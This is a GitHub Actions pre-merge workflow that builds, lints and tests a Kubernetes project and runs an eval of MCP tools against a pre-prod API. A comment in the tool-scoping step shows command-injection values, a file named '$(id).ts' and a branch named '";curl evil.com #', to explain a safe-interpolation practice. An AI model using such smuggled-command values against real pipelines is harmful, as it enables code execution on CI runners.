name: Pre merge

concurrency:
  # This stops any build on a branch if a new commit is pushed on that branch
  # the second check is here to run each build when pushing on the branch `q/*`
  # in order for bert-e to merge any branch that passes the queue before waiting
  # for the entire queue to passe the build.
  # if the branch is 'q/*' then we append the commit sha to the concurrency group to make it unique.
  # this works because the '||' or condition will only evaluate the right side if the left side is false ;-)
  group: "tests-${{ github.ref_name }}-${{ ( !startsWith(github.ref_name, 'q/') || github.sha) }}"
  cancel-in-progress: true

on:
  push:
    branches:
      - "feature/**"
      - "improvement/**"
      - "hotfix/**"
      - "bugfix/**"
      - "documentation/**"
      - "user/**"
      - "dependabot/**"
      - "w/**"
      - "q/*/**"
      - "!w/release/**"

jobs:
  changed-files:
    runs-on: ubuntu-24.04
    outputs:
      docs: ${{ steps.diff.outputs.docs_any_modified == 'true' }}
      shell-ui: ${{ steps.diff.outputs.shell-ui_any_modified == 'true' }}
      unit-tests-ui: ${{ steps.diff.outputs.unit-tests-ui_any_modified == 'true' }}
      unit-tests-shell-ui: ${{ steps.diff.outputs.unit-tests-shell-ui_any_modified == 'true' }}
      eval-mcp-tools: ${{ steps.diff.outputs.eval-mcp-tools_any_modified == 'true' }}
      # The file list too, not just the boolean: the job narrows EVAL_TOOLS to the tools that
      # actually changed, and needs the names to do it.
      eval-mcp-tools-files: ${{ steps.diff.outputs.eval-mcp-tools_all_changed_files }}
      unit-tests-crd-client-generator: ${{ steps.diff.outputs.unit-tests-crd-client-generator_any_modified == 'true' }}
      unit-tests-metalk8s-operator: ${{ steps.diff.outputs.unit-tests-metalk8s-operator_any_modified == 'true' }}
      unit-tests-storage-operator: ${{ steps.diff.outputs.unit-tests-storage-operator_any_modified == 'true' }}
      unit-tests-salt: ${{ steps.diff.outputs.unit-tests-salt_any_modified == 'true' }}
      unit-tests-buildchain: ${{ steps.diff.outputs.unit-tests-buildchain_any_modified == 'true' }}
      unit-tests-lib-alert-tree: ${{ steps.diff.outputs.unit-tests-lib-alert-tree_any_modified == 'true' }}
      integration-tests-ui: ${{ steps.diff.outputs.integration-tests-ui_any_modified == 'true' }}
      upgrade-operator-sdk-operator: ${{ steps.diff.outputs.upgrade-operator-sdk-operator_any_modified == 'true' }}
      upgrade-operator-sdk-storage-operator: ${{ steps.diff.outputs.upgrade-operator-sdk-storage-operator_any_modified == 'true' }}
      # If the workflow is triggered on a development branch let's always build
      build: ${{ startsWith(github.ref_name, 'development/') || steps.diff.outputs.build_any_modified == 'true' }}
    steps:
      - name: Checkout
        uses: actions/checkout@v7
        with:
          fetch-depth: 0
      - name: Get base sha
        run: |
          source VERSION
          branch=development/${VERSION_MAJOR}.${VERSION_MINOR}
          if [[ ! $(git ls-remote --heads origin $branch) ]]; then
            branch=development/${VERSION_MAJOR}
          fi
          echo "BASE_SHA=$(git merge-base HEAD origin/$branch)" >> $GITHUB_ENV
      - name: Get changed files
        id: diff
        uses: tj-actions/changed-files@v47
        with:
          base_sha: ${{ env.BASE_SHA }}
          files_yaml_from_source_file: .github/changed-files.yaml
      - name: List all changed files
        env:
          ALL_DOCS_CHANGED_FILES: ${{ steps.diff.outputs.docs_all_changed_files }}
          ALL_SHELL_UI_CHANGED_FILES: ${{ steps.diff.outputs.shell-ui_all_changed_files }}
          ALL_UNIT_TESTS_UI_CHANGED_FILES: ${{ steps.diff.outputs.unit-tests-ui_all_changed_files }}
          ALL_UNIT_TESTS_SHELL_UI_CHANGED_FILES: ${{ steps.diff.outputs.unit-tests-shell-ui_all_changed_files }}
          ALL_UNIT_TESTS_CRD_CLIENT_GENERATOR_CHANGED_FILES: ${{ steps.diff.outputs.unit-tests-crd-client-generator_all_changed_files }}
          ALL_UNIT_TESTS_METALK8S_OPERATOR_CHANGED_FILES: ${{ steps.diff.outputs.unit-tests-metalk8s-operator_all_changed_files }}
          ALL_UNIT_TESTS_STORAGE_OPERATOR_CHANGED_FILES: ${{ steps.diff.outputs.unit-tests-storage-operator_all_changed_files }}
          ALL_UNIT_TESTS_SALT_CHANGED_FILES: ${{ steps.diff.outputs.unit-tests-salt_all_changed_files }}
          ALL_UNIT_TESTS_BUILDCHAIN_CHANGED_FILES: ${{ steps.diff.outputs.unit-tests-buildchain_all_changed_files }}
          ALL_UNIT_TESTS_LIB_ALERT_TREE_CHANGED_FILES: ${{ steps.diff.outputs.unit-tests-lib-alert-tree_all_changed_files }}
          ALL_INTEGRATION_TESTS_UI_CHANGED_FILES: ${{ steps.diff.outputs.integration-tests-ui_all_changed_files }}
          ALL_UPGRADE_OPERATOR_SDK_OPERATOR_CHANGED_FILES: ${{ steps.diff.outputs.upgrade-operator-sdk-operator_all_changed_files }}
          ALL_UPGRADE_OPERATOR_SDK_STORAGE_OPERATOR_CHANGED_FILES: ${{ steps.diff.outputs.upgrade-operator-sdk-storage-operator_all_changed_files }}
          ALL_BUILD_CHANGED_FILES: ${{ steps.diff.outputs.build_all_changed_files }}
        run: |
          for type in docs shell-ui unit-tests-ui unit-tests-shell-ui unit-tests-crd-client-generator unit-tests-metalk8s-operator unit-tests-storage-operator unit-tests-salt unit-tests-buildchain unit-tests-lib-alert-tree integration-tests-ui upgrade-operator-sdk-operator upgrade-operator-sdk-storage-operator build; do
            echo "All $type changed files:"
            changed_files_var=$(echo "ALL_${type^^}_CHANGED_FILES" | tr '-' '_')
            echo "${!changed_files_var}"
          done

  build-devcontainer:
    uses: ./.github/workflows/build-devcontainer.yaml
    secrets: inherit

  build:
    needs:
      - build-devcontainer
      - changed-files
    if: needs.changed-files.outputs.build == 'true'
    uses: ./.github/workflows/build.yaml
    with:
      skip-devcontainer: true
    secrets: inherit

  build-docs:
    needs:
      - build-devcontainer
      - changed-files
    # Build of docs is triggered by "build" so do not re-trigger it
    if: needs.changed-files.outputs.docs == 'true' && needs.changed-files.outputs.build != 'true'
    uses: ./.github/workflows/build-docs.yaml
    with:
      skip-devcontainer: true
    secrets: inherit

  build-shell-ui:
    needs: changed-files
    # Build of shell-ui is triggered by "build" so do not re-trigger it
    if: needs.changed-files.outputs.shell-ui == 'true' && needs.changed-files.outputs.build != 'true'
    uses: ./.github/workflows/build-shell-ui.yaml
    secrets: inherit

  e2e-tests:
    needs:
      - build
      - changed-files
    if: needs.changed-files.outputs.build == 'true'
    uses: ./.github/workflows/e2e-tests.yaml
    secrets: inherit
    with:
      artifacts-url: ${{ needs.build.outputs.artifact-link }}

  lint:
    runs-on: ubuntu-latest
    needs:
      - build-devcontainer
    container:
      image: ghcr.io/${{ github.repository }}/devcontainer:${{ github.sha }}
      # We have to use `root` for the moment
      # Sees: https://github.com/actions/checkout/issues/1575
      # Could work with a user with 1001 id but not for docker
      options: --user root
      credentials:
        username: ${{ github.repository_owner }}
        password: ${{ secrets.GITHUB_TOKEN }}
    defaults:
      run:
        shell: bash
    steps:
      - name: Checkout
        uses: actions/checkout@v7
      - name: Set safe directory (since container is root and not user 1001)
        run: git config --global --add safe.directory $GITHUB_WORKSPACE
      - name: Run all linting targets
        run: ./doit.sh lint

  unit_tests_ui:
    needs: changed-files
    if: needs.changed-files.outputs.unit-tests-ui == 'true'
    runs-on: ubuntu-24.04
    steps:
      - name: Checkout
        uses: actions/checkout@v7
      - name: Install node
        uses: actions/setup-node@v6
        with:
          node-version: "20"
      - name: Cache node modules
        id: cache-npm
        uses: actions/cache@v5
        env:
          cache-name: cache-node-modules
        with:
          # npm cache files are stored in `~/.npm` on Linux/macOS
          path: ~/.npm
          key: ${{ runner.os }}-build-${{ env.cache-name }}-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            ${{ runner.os }}-build-${{ env.cache-name }}-
            ${{ runner.os }}-build-
            ${{ runner.os }}-
      - name: Install UI dependencies
        run: |
          cd ui
          npm ci --prefer-offline --no-audit --legacy-peer-deps --unsafe-perm --no-optional
      - name: Run all UI unit tests
        run: |
          cd ui
          npm run test:nowatch --no-update-notifier
      - name: Prepare artifacts
        run: mkdir -p "artifacts/ui" && mv ui/junit artifacts/ui/
      - name: Upload artifacts
        uses: scality/action-artifacts@v4
        with:
          method: upload
          url: https://artifacts.scality.net
          user: ${{ secrets.ARTIFACTS_USER }}
          password: ${{ secrets.ARTIFACTS_PASSWORD }}
          source: artifacts

  eval_mcp_tools:
    needs: changed-files
    if: needs.changed-files.outputs.eval-mcp-tools == 'true'
    runs-on: ubuntu-24.04
    timeout-minutes: 45
    # ONE SIGN-IN AT A TIME, ACROSS THE WHOLE REPOSITORY. Every run signs the same OneLogin account
    # in, and OneLogin locks an account after a handful of failures — so two concurrent runs could
    # lock it between them, and a locked account takes a human to clear.
    #
    # `cancel-in-progress: false` only keeps a QUEUED sign-in from being dropped for another run in
    # this group. It cannot save this job from the workflow-level group at the top of the file,
    # which cancels the whole run on the next push to the branch. That is survivable: a cancelled
    # sign-in is not a failed attempt, so it counts toward no lockout.
    concurrency:
      group: guardian-eval-onelogin
      cancel-in-progress: false
    # NOT BLOCKING. The eval is non-deterministic and costs model tokens, and a failure means "a
    # description is ambiguous" — a finding to read, not a reason to stop an unrelated change.
    continue-on-error: true
    # ONE definition, read by the contract check and by the eval below.
    #
    # The pre-prod API GATEWAY, not a UI host: those are IP-filtered, while the gateway is not,
    # which is what makes a hosted runner workable. No trailing slash: the eval appends
    # /api/v1/chat/ to it directly. PRE-PROD ONLY.
    env:
      GUARDIAN_URL: "https://pre-prod-guardian-api-gateway-6lp945ti.ew.gateway.dev"
    defaults:
      run:
        working-directory: ui
    steps:
      - name: Checkout
        uses: actions/checkout@v7
        with:
          # Needed to diff against this PR's own base branch, below.
          fetch-depth: 0
      - name: Install node
        uses: actions/setup-node@v6
        with:
          node-version: "20"
      - name: Install UI dependencies
        run: npm ci --prefer-offline --no-audit --legacy-peer-deps --unsafe-perm --no-optional
      # THE ONE DEPENDENCY DELIBERATELY NOT PINNED, AND THE STEP THAT MAKES THAT TRUE.
      #
      # `npm ci` installs strictly from the lockfile: it ignores the range in package.json and
      # restores the one version resolved when the lockfile was written. So `^0.1.0` alone floats
      # nothing — this step is what gives the range its meaning.
      #
      # webmcp-eval owns the shape of the Guardian chat request. Guardian ships to production
      # whenever they like and MetalK8s does not, so when they change the contract the fix belongs
      # in the package and has to reach branches cut before the break. Re-running this job picks
      # it up; nothing here is edited, released or redeployed.
      #
      # It stays inside 0.1.x. A 0.2.0 is this package saying its own surface moved.
      - name: take the newest compatible webmcp-eval
        run: |
          npm install --no-save --prefer-online --legacy-peer-deps '@scality/webmcp-eval@^0.1.0'
          echo "webmcp-eval: $(node -p "require('@scality/webmcp-eval/package.json').version")"
      # WHAT DOES THIS PR ADD, not what does the branch contain. A stacked branch inherits every
      # tool its parents introduced, and this job would otherwise fire on all of them.
      #
      # The workflow runs on push, so there is no PR context; the API has it. With no open PR yet,
      # fall back to the development-branch list, which over-runs rather than under-runs.
      - name: work out which tools changed
        id: scope
        working-directory: ${{ github.workspace }}
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          # EVERY ${{ }} goes through env, never into the script text. The runner substitutes
          # before bash parses, so an interpolated value is CODE: a file named `$(id).ts` under
          # tools/, or a branch named `";curl evil.com #` — both legal names — would be executed
          # rather than read. Through env they arrive as data.
          FALLBACK_FILES: ${{ needs.changed-files.outputs.eval-mcp-tools-files }}
          REPO: ${{ github.repository }}
          OWNER: ${{ github.repository_owner }}
          REF_NAME: ${{ github.ref_name }}
        run: |
          set -euo pipefail
          base=$(gh api --method GET "repos/$REPO/pulls" \
                   -f "head=$OWNER:$REF_NAME" -f state=open \
                   --jq '.[0].base.ref // empty' 2>/dev/null || true)

          if [ -n "$base" ]; then
            git fetch -q origin "$base"
            # The same paths changed-files.yaml triggers on, the eval's own material included.
            # A scenario file maps to no tool, so a scenario-only PR produces an empty list and
            # skips at the guard below -- run it locally instead.
            files=$(git diff --name-only "origin/$base...HEAD" \
                      -- 'ui/src/mcpTools/tools/' 'ui/src/mcpTools/evals/' \
                         'ui/src/mcpTools/mcpTools.eval.test.ts')
            echo "base: $base (this PR's target)"
          else
            files="$FALLBACK_FILES"
            echo "no open PR for this branch — falling back to the development-branch diff"
          fi

          if [ -z "$files" ]; then
            echo "run=false" >> "$GITHUB_OUTPUT"
            echo "no tool changed against the base — nothing to evaluate"
            exit 0
          fi

          echo "changed: $files"
          # EVAL_TOOLS_DIR is required: the package will not guess a layout, so where this
          # repository keeps its tools is named here and nowhere else.
          tools=$(EVAL_TOOLS_DIR="ui/src/mcpTools/tools" \
                  ui/node_modules/.bin/webmcp-eval-tools-for $files)

          # NO TOOL RECOGNISED MEANS SKIP, NOT RUN EVERYTHING.
          #
          # An empty EVAL_TOOLS means "no filter" to the package, which runs the whole suite --
          # the right default for a developer who never set it, and the wrong one here. This step
          # knows WHY the list is empty and the package cannot, so the decision belongs here.
          #
          #   npm run eval:mcp        (from ui/)
          if [ -z "$tools" ]; then
            echo "run=false" >> "$GITHUB_OUTPUT"
            echo "eval material changed but no tool did — nothing to evaluate here."
            echo "Run it locally if you changed a scenario: cd ui && npm run eval:mcp"
            exit 0
          fi

          echo "run=true" >> "$GITHUB_OUTPUT"
          echo "EVAL_TOOLS=$tools" >> "$GITHUB_ENV"
          echo "narrowed to: $tools"
      # DOES ANY SCENARIO ACTUALLY COVER THESE TOOLS? Asked before the sign-in, because the answer
      # is free -- a dry run drives no model and needs no token -- and the sign-in is the part
      # that is rate-limited and shared. Every one is another chance of locking the OneLogin
      # account for everybody.
      #
      # A FAILED dry run is not "no scenario". A type error in a scenario, a bad import or a
      # missing bin prints no `N/M scenarios` either, and skipping green on that would hide a
      # broken eval behind the same message as an uncovered tool. So the exit code is checked
      # first and `any=false` can only come from a dry run that worked.
      #
      # This reads runSuite's own progress output rather than an API, which is a coupling to the
      # package. `N/M scenarios` appears in both lines it prints, so the match holds whether or
      # not EVAL_TOOLS is set, and `0/M` never matches.
      - name: does any scenario cover them
        id: covered
        if: steps.scope.outputs.run == 'true'
        run: |
          set -o pipefail
          rc=0
          out=$(EVAL_DRY_RUN=1 npm run eval:mcp 2>&1) || rc=$?
          echo "$out"
          if [ "$rc" -ne 0 ]; then echo "::error::eval dry run failed (exit $rc)"; exit "$rc"; fi
          if echo "$out" | grep -qE '[1-9][0-9]*/[0-9]+ scenarios'; then
            echo "any=true" >> "$GITHUB_OUTPUT"
          else
            echo "any=false" >> "$GITHUB_OUTPUT"
            echo "::notice::No scenario covers ${EVAL_TOOLS:-the changed tools} - not signing in. Write one, or run it locally."
          fi
      # Only the browser the token script drives. `--with-deps` because a bare runner is missing
      # the shared libraries headless Chromium needs, and the failure without them reads as a crash.
      - name: install chromium
        if: steps.covered.outputs.any == 'true'
        run: npx playwright install --with-deps chromium
      # The token, minted headlessly from a secret and exported as GUARDIAN_TOKEN, which the eval
      # reads in place of the local file `make token` writes — so nothing here depends on a
      # developer's machine.
      - name: mint a Guardian token
        id: token
        if: steps.covered.outputs.any == 'true'
        env:
          GUARDIAN_EVAL_ONE_LOGIN_USERNAME: ${{ secrets.GUARDIAN_EVAL_ONE_LOGIN_USERNAME }}
          GUARDIAN_EVAL_ONE_LOGIN_PASSWORD: ${{ secrets.GUARDIAN_EVAL_ONE_LOGIN_PASSWORD }}
        run: |
          set -euo pipefail
          if [ -z "${GUARDIAN_EVAL_ONE_LOGIN_PASSWORD:-}" ]; then
            echo "minted=false" >> "$GITHUB_OUTPUT"
            echo "::warning::OneLogin credentials are not set in this repository — skipping the eval."
            exit 0
          fi
          # TODO: port scripts/onelogin-token.mjs from artesca, or share it. Until then this job
          # reaches here and stops, which is why `minted` is an output rather than an assumption.
          echo "minted=false" >> "$GITHUB_OUTPUT"
          echo "::warning::No token script in this repository yet — the eval cannot run."
      # IS THE API STILL THE API? Asked before the eval, because it is the difference between
      # "the tools regressed" and "Guardian shipped a schema change this morning" — and those two
      # look identical from a wall of failed scenarios.
      #
      # Exit 2 (document unreachable) is NOT a contract break — the bin keeps them separate, and
      # a 404 here most likely means the gateway does not forward /openapi.json yet.
      - name: check the Guardian chat contract
        id: contract
        if: steps.covered.outputs.any == 'true' && steps.token.outputs.minted == 'true'
        continue-on-error: true
        run: |
          # pipefail, or `tee` reports success and a moved contract passes silently.
          set -o pipefail
          # The LOCAL bin, never npx: npx falls back to downloading whatever package carries that
          # name on the registry and would hand it GUARDIAN_TOKEN.
          #
          # rc is recorded so the summary step can tell exit 2 (document unreachable, not evidence
          # about the contract) from exit 1 (the contract really moved).
          rc=0
          node_modules/.bin/webmcp-eval-contract "$GUARDIAN_URL" --token "$GUARDIAN_TOKEN" \
            | tee "$RUNNER_TEMP/contract.txt" || rc=$?
          echo "rc=$rc" >> "$GITHUB_OUTPUT"
          exit $rc
      - name: say so in the summary
        if: always() && steps.contract.outcome == 'failure' && steps.contract.outputs.rc != '2'
        run: |
          {
            echo "### Guardian chat contract moved"
            echo
            echo 'Scenario failures below are most likely NOT about the tool descriptions.'
            echo
            echo '```'
            cat "$RUNNER_TEMP/contract.txt" 2>/dev/null || echo "(no report captured)"
            echo '```'
          } >> "$GITHUB_STEP_SUMMARY"
      - name: run the WebMCP tool eval
        if: steps.covered.outputs.any == 'true' && steps.token.outputs.minted == 'true'
        run: npm run eval:mcp

  unit_tests_shell_ui:
    needs: changed-files
    if: needs.changed-files.outputs.unit-tests-shell-ui == 'true'
    runs-on: ubuntu-24.04
    steps:
      - name: Checkout
        uses: actions/checkout@v7
      - name: Install node
        uses: actions/setup-node@v6
        with:
          node-version: "20"
      - name: Cache node modules
        id: cache-npm
        uses: actions/cache@v5
        env:
          cache-name: cache-node-modules
        with:
          # npm cache files are stored in `~/.npm` on Linux/macOS
          path: ~/.npm
          key: ${{ runner.os }}-build-${{ env.cache-name }}-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            ${{ runner.os }}-build-${{ env.cache-name }}-
            ${{ runner.os }}-build-
            ${{ runner.os }}-
      - name: Install UI dependencies
        run: |
          cd shell-ui
          npm ci --prefer-offline --no-audit --legacy-peer-deps -d
      - name: Run all Shell UI unit tests
        run: |
          cd shell-ui
          npm run test --no-update-notifier

  unit_tests_crd_client_generator:
    needs: changed-files
    if: needs.changed-files.outputs.unit-tests-crd-client-generator == 'true'
    runs-on: ubuntu-24.04
    defaults:
      run:
        working-directory: "tools/crd-client-generator-js"
    steps:
      - name: Checkout
        uses: actions/checkout@v7
      - name: Install node
        uses: actions/setup-node@v6
        with:
          node-version: "20"
      - name: Cache node modules
        uses: actions/cache@v5
        env:
          cache-name: cache-node-modules
        with:
          # npm cache files are stored in `~/.npm` on Linux/macOS
          path: ~/.npm
          key: ${{ runner.os }}-build-${{ env.cache-name }}-${{ hashFiles('package-lock.json') }}
          restore-keys: |
            ${{ runner.os }}-build-${{ env.cache-name }}-
            ${{ runner.os }}-build-
            ${{ runner.os }}-
      - name: Install CRD client generator dependencies
        run: npm ci --prefer-offline --no-audit
      - name: Run all CRD client generator unit tests
        run: npm run test --no-update-notifier

  unit_tests_metalk8s_operator:
    runs-on: ubuntu-latest
    needs:
      - build-devcontainer
      - changed-files
    container:
      image: ghcr.io/${{ github.repository }}/devcontainer:${{ github.sha }}
      # We have to use `root` for the moment
      # Sees: https://github.com/actions/checkout/issues/1575
      # Could work with a user with 1001 id but not for docker
      options: --user root
      credentials:
        username: ${{ github.repository_owner }}
        password: ${{ secrets.GITHUB_TOKEN }}
    defaults:
      run:
        shell: bash
        working-directory: "operator"
    if: needs.changed-files.outputs.unit-tests-metalk8s-operator == 'true'
    steps:
      - name: Checkout
        uses: actions/checkout@v7
      - name: Set safe directory (since container is root and not user 1001)
        run: git config --global --add safe.directory $GITHUB_WORKSPACE
      - name: Run all MetalK8s operator unit and integration tests
        run: make test

  unit_tests_storage_operator:
    runs-on: ubuntu-latest
    needs:
      - build-devcontainer
      - changed-files
    container:
      image: ghcr.io/${{ github.repository }}/devcontainer:${{ github.sha }}
      # We have to use `root` for the moment
      # Sees: https://github.com/actions/checkout/issues/1575
      # Could work with a user with 1001 id but not for docker
      options: --user root
      credentials:
        username: ${{ github.repository_owner }}
        password: ${{ secrets.GITHUB_TOKEN }}
    defaults:
      run:
        shell: bash
        working-directory: "storage-operator"
    if: needs.changed-files.outputs.unit-tests-storage-operator == 'true'
    steps:
      - name: Checkout
        uses: actions/checkout@v7
      - name: Set safe directory (since container is root and not user 1001)
        run: git config --global --add safe.directory $GITHUB_WORKSPACE
      - name: Run all storage-operator unit and integration tests
        run: make test

  check_upgrade_metalk8s_operator:
    needs:
      - build-devcontainer
      - changed-files
    if: needs.changed-files.outputs.upgrade-operator-sdk-operator == 'true'
    uses: ./.github/workflows/check-upgrade-operator-sdk.yaml
    with:
      operator-dir: operator
      config-dir: tools/upgrade-operator-sdk/operator
    secrets: inherit

  check_upgrade_storage_operator:
    needs:
      - build-devcontainer
      - changed-files
    if: needs.changed-files.outputs.upgrade-operator-sdk-storage-operator == 'true'
    uses: ./.github/workflows/check-upgrade-operator-sdk.yaml
    with:
      operator-dir: storage-operator
      config-dir: tools/upgrade-operator-sdk/storage-operator
    secrets: inherit

  unit_tests_salt:
    runs-on: ubuntu-latest
    needs:
      - build-devcontainer
      - changed-files
    container:
      image: ghcr.io/${{ github.repository }}/devcontainer:${{ github.sha }}
      # We have to use `root` for the moment
      # Sees: https://github.com/actions/checkout/issues/1575
      # Could work with a user with 1001 id but not for docker
      options: --user root
      credentials:
        username: ${{ github.repository_owner }}
        password: ${{ secrets.GITHUB_TOKEN }}
    defaults:
      run:
        shell: bash
    if: needs.changed-files.outputs.unit-tests-salt == 'true'
    steps:
      - name: Checkout
        uses: actions/checkout@v7
      - name: Set safe directory (since container is root and not user 1001)
        run: git config --global --add safe.directory $GITHUB_WORKSPACE
      - name: Run all salt unit tests
        run: tox -e unit-tests

  unit_tests_buildchain:
    runs-on: ubuntu-latest
    needs:
      - build-devcontainer
      - changed-files
    container:
      image: ghcr.io/${{ github.repository }}/devcontainer:${{ github.sha }}
      # We have to use `root` for the moment
      # Sees: https://github.com/actions/checkout/issues/1575
      # Could work with a user with 1001 id but not for docker
      options: --user root
      credentials:
        username: ${{ github.repository_owner }}
        password: ${{ secrets.GITHUB_TOKEN }}
    defaults:
      run:
        shell: bash
    if: needs.changed-files.outputs.unit-tests-buildchain == 'true'
    steps:
      - name: Checkout
        uses: actions/checkout@v7
      - name: Set safe directory (since container is root and not user 1001)
        run: git config --global --add safe.directory $GITHUB_WORKSPACE
      - name: Run all buildchain unit tests
        run: tox -e unit-tests-buildchain

  unit_tests_lib_alert_tree:
    runs-on: ubuntu-latest
    needs:
      - build-devcontainer
      - changed-files
    container:
      image: ghcr.io/${{ github.repository }}/devcontainer:${{ github.sha }}
      # We have to use `root` for the moment
      # Sees: https://github.com/actions/checkout/issues/1575
      # Could work with a user with 1001 id but not for docker
      options: --user root
      credentials:
        username: ${{ github.repository_owner }}
        password: ${{ secrets.GITHUB_TOKEN }}
    defaults:
      run:
        shell: bash
        working-directory: "tools/lib-alert-tree"
    if: needs.changed-files.outputs.unit-tests-lib-alert-tree == 'true'
    steps:
      - name: Checkout
        uses: actions/checkout@v7
      - name: Set safe directory (since container is root and not user 1001)
        run: git config --global --add safe.directory $GITHUB_WORKSPACE
      - name: Install lib_alert_tree
        run: poetry install -E cli
      - name: Run all lib_alert_tree unit tests
        run: poetry run pytest -vv

  build_integration_container_nginx:
    needs: changed-files
    if: needs.changed-files.outputs.integration-tests-ui == 'true'
    runs-on: ubuntu-24.04
    permissions: write-all
    steps:
      - name: Checkout
        uses: actions/checkout@v7
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v4
      - name: Install node
        uses: actions/setup-node@v6
        with:
          node-version: "20"
      - name: Cache node modules
        id: cache-npm
        uses: actions/cache@v5
        env:
          cache-name: cache-node-modules
        with:
          # npm cache files are stored in `~/.npm` on Linux/macOS
          path: ~/.npm
          key: ${{ runner.os }}-build-${{ env.cache-name }}-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            ${{ runner.os }}-build-${{ env.cache-name }}-
            ${{ runner.os }}-build-
            ${{ runner.os }}-
      - name: Install Shell UI dependencies
        run: |
          cd shell-ui
          npm ci --legacy-peer-deps
      - name: Build Shell UI
        run: |
          cd shell-ui
          npm run build
      - name: Install UI dependencies
        run: |
          cd ui
          npm ci --legacy-peer-deps
      - name: Build UI
        run: |
          cd ui
          npm run build
      - name: Prepare Services Volumes
        run: |
          mkdir -p service
          mkdir -p service/shell
          mkdir -p service/metalk8s
          cp -r ui/build/* service/metalk8s/
          cp -r ui/build/.well-known service/metalk8s/.well-known
          cp -r shell-ui/build/* service/shell/
      - name: Build container with nginx configuration for integration tests
        run: |
          cat > Dockerfile <<EOF
          FROM nginx:alpine
          COPY ui/standalone-nginx.conf /etc/nginx/conf.d/default.conf
          ADD service /usr/share/nginx/html
          EOF
      - name: Login to Registry
        uses: docker/login-action@v4
        with:
          registry: ghcr.io
          username: ${{ github.repository_owner }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - uses: docker/build-push-action@v7
        with:
          push: true
          file: Dockerfile
          context: .
          tags: ghcr.io/${{ github.repository_owner }}/metalk8s-nginx-integration-tests:${{ github.sha }}

  integration_tests_ui:
    runs-on: ubuntu-24.04-8core
    needs:
      - build_integration_container_nginx
      - changed-files
    if: needs.changed-files.outputs.integration-tests-ui == 'true'
    services:
      app:
        image: ghcr.io/${{ github.repository_owner }}/metalk8s-nginx-integration-tests:${{ github.sha }}
        credentials:
          username: ${{ github.repository_owner }}
          password: ${{ secrets.GITHUB_TOKEN }}
        ports:
          - 80:80
    steps:
      - name: Checkout
        uses: actions/checkout@v7
      - name: Install node
        uses: actions/setup-node@v6
        with:
          node-version: "20"
      - name: Cache node modules
        id: cache-npm
        uses: actions/cache@v5
        env:
          cache-name: cache-node-modules
        with:
          # npm cache files are stored in `~/.npm` on Linux/macOS
          path: ~/.npm
          key: ${{ runner.os }}-build-${{ env.cache-name }}-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            ${{ runner.os }}-build-${{ env.cache-name }}-
            ${{ runner.os }}-build-
            ${{ runner.os }}-
      - name: Install Cypress and its dependencies
        run: |
          cd ui
          PKGS="har-validator cypress cypress-wait-until @testing-library/cypress querystring"
          for pkg in $PKGS; do
            npm install --no-save --no-package-lock --legacy-peer-deps $pkg@$(node -p \
              -e "require('./package-lock.json').dependencies['$pkg'].version" \
            ) || exit 1
          done
      - name: Wait for application to be available
        run: |
          bash -c '
            attempts=0
            until curl -Isfo /dev/null http://localhost/; do
              (( attempts++ ))
              if [ $attempts -gt 100 ]; then
                >&2 echo "Failed to reach application after 5 minutes"
                exit 1
              fi
              sleep 3
            done
          '
      - name: Run all UI integration tests
        env:
          CYPRESS_BASE_URL: http://localhost
        run: |
          cd ui
          rm -rf babel.config.js
          npm run test:integration --no-update-notifier
      - name: Prepare upload folder
        if: always()
        run: |
          mkdir -p upload/ui/cypress
          mv ui/cypress/screenshots upload/ui/cypress/screenshots || true
          mv ui/cypress/videos upload/ui/cypress/videos || true
          mv junit upload/ui || true
      - name: Upload artifacts
        if: always()
        uses: scality/action-artifacts@v4
        with:
          method: upload
          url: https://artifacts.scality.net
          user: ${{ secrets.ARTIFACTS_USER }}
          password: ${{ secrets.ARTIFACTS_PASSWORD }}
          source: upload

  write-final-status:
    runs-on: ubuntu-24.04
    needs:
      - changed-files
      - build-docs
      - build-shell-ui
      - e2e-tests
      - lint
      - unit_tests_ui
      - unit_tests_shell_ui
      - unit_tests_crd_client_generator
      - unit_tests_metalk8s_operator
      - unit_tests_storage_operator
      - check_upgrade_metalk8s_operator
      - check_upgrade_storage_operator
      - unit_tests_salt
      - unit_tests_buildchain
      - unit_tests_lib_alert_tree
      - integration_tests_ui
    if: always()
    steps:
      - name: Checkout
        uses: actions/checkout@v7
      - name: Upload final status
        if: always()
        uses: scality/actions/upload_final_status@1.17.0
        with:
          ARTIFACTS_USER: ${{ secrets.ARTIFACTS_USER }}
          ARTIFACTS_PASSWORD: ${{ secrets.ARTIFACTS_PASSWORD }}
          JOBS_RESULTS: ${{ join(needs.*.result) }}
